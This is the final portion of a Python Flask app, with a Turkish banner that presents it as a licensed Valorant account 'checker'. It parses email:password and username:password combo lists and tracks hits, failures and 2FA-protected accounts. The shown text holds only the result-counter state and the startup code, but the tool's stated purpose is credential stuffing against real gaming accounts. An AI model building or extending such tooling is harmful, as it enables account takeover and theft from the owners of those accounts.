    "running": False,
    "platform": "",
    "total": 0,
    "success": 0,
    "fail": 0,
    "twofa": 0,
    "error": 0,
    "remaining": 0,
    "logs": ["🟢 Sistem hazır."],
    "hits": [],
    "twofa_list": []
}

# ============================================================
# BAŞLAT
# ============================================================
if __name__ == "__main__":
    if not os.path.exists(KEYS_FILE):
        save_keys({})
    port = int(os.environ.get("PORT", 5000))
    print("""
    ╔══════════════════════════════════════════════════════════════════╗
    ║     🔱 RODA - API KEŞİF + CHECKER + AYRIŞTIRMA (TÜRKÇE)        ║
    ║     Master key: ORTAM DEĞİŞKENİNDE (RODA_MASTER_KEY)          ║
    ║     1 KEY 1 IP - 1 KULLANIM                                   ║
    ║     http://0.0.0.0:""" + str(port) + """                               ║
    ║     VALORANT GERÇEK API (SENİN VERDİĞİN)                     ║
    ║     Loglar & Valo Detay SADECE ADMIN                         ║
    ║     2 MOD AYRIŞTIRMA (Email:Şifre / Kullanıcı:Şifre)        ║
    ║     YEŞİLİMSİ MAVİ TEMA                                     ║
    ╚══════════════════════════════════════════════════════════════════╝
    """)
    app.run(host="0.0.0.0", port=port, debug=False)
